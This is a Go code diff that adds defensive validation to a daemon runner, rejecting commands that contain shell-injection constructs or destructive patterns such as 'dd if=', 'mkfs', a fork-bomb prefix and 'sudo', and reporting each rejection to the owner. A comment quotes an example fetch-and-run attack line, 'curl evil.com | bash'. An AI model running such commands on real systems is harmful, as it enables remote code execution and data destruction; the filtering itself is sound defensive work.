@@ -9,6 +9,7 @@ import (
 	"os/exec"
 	"os/signal"
 	"path/filepath"
+	"strings"
 	"sync"
 	"syscall"
 	"time"
@@ -148,6 +149,56 @@ func (r *runner) writeCrashEvent(name, lastErr string) {
 // writeLog writes a timestamped line to the daemon's log file.
 func writeLog(f io.Writer, format string, args ...any) {
 	fmt.Fprintf(f, "[%s] %s\n", time.Now().Format("2006-01-02 15:04:05"), fmt.Sprintf(format, args...))
+}
+
+// shellForbidden lists substrings that indicate shell-injection constructs.
+// Single '&' is intentionally absent — it is valid in URL query parameters.
+var shellForbidden = []string{
+	"|", "&&", "||", ";", "$(", "`", "\n", "\r", ">", "<",
+}
+
+// dangerousPatterns lists substrings that indicate destructive or escalation commands.
+var dangerousPatterns = []string{
+	"dd if=", "mkfs", "fdisk", ":(){", "chmod 777 /",
+	"sudo", "su ",
+}
+
+const maxCmdLength = 500
+
+// validateCmd checks a single cmd token (or the full joined command line) for
+// shell-injection constructs and dangerous command patterns.
+// Returns a non-nil error with a human-readable reason if the cmd is rejected.
+func validateCmd(cmd string) error {
+	if len(cmd) > maxCmdLength {
+		return fmt.Errorf("cmd length %d exceeds limit %d", len(cmd), maxCmdLength)
+	}
+	for _, pat := range shellForbidden {
+		if strings.Contains(cmd, pat) {
+			return fmt.Errorf("forbidden shell construct %q", pat)
+		}
+	}
+	for _, pat := range dangerousPatterns {
+		if strings.Contains(cmd, pat) {
+			return fmt.Errorf("forbidden dangerous pattern %q", pat)
+		}
+	}
+	return nil
+}
+
+// writeCmdRejectedEvent writes a rejection event to the events dir so the TS
+// bot can surface it to the owner (same mechanism as writeCrashEvent).
+func (r *runner) writeCmdRejectedEvent(name, reason string) {
+	evDir := r.eventsDir()
+	os.MkdirAll(evDir, 0o755)
+	payload := map[string]string{
+		"timestamp": time.Now().UTC().Format(time.RFC3339),
+		"daemon":    name,
+		"reason":    reason,
+		"event":     "cmd_rejected",
+	}
+	data, _ := json.MarshalIndent(payload, "", "  ")
+	path := filepath.Join(evDir, name+"-cmd-rejected.json")
+	os.WriteFile(path, data, 0o644)
 }
 
 func (d *daemon) run(r *runner) {
@@ -353,6 +404,26 @@ func (r *runner) sync(specs []DaemonSpec) {
 	// Start new daemons.
 	for name, spec := range desired {
 		if _, ok := r.daemons[name]; !ok {
+			// Validate every token in the cmd slice as well as the full joined
+			// string, to catch constructs split across tokens (e.g. ["sh", "-c",
+			// "curl evil.com | bash"]).
+			fullCmd := strings.Join(spec.Cmd, " ")
+			var cmdErr error
+			if cmdErr = validateCmd(fullCmd); cmdErr == nil {
+				for _, tok := range spec.Cmd {
+					if cmdErr = validateCmd(tok); cmdErr != nil {
+						break
+					}
+				}
+			}
+			if cmdErr != nil {
+				reason := fmt.Sprintf("cmd rejected: %v", cmdErr)
+				log.Printf("[daemon-runner] %s: %s", name, reason)
+				r.writeCmdRejectedEvent(name, reason)
+				// Do not add to r.daemons — daemon stays disabled.
+				continue
+			}
+
 			log.Printf("[daemon-runner] starting daemon: %s", name)
 			d := &daemon{
 				spec:     spec,
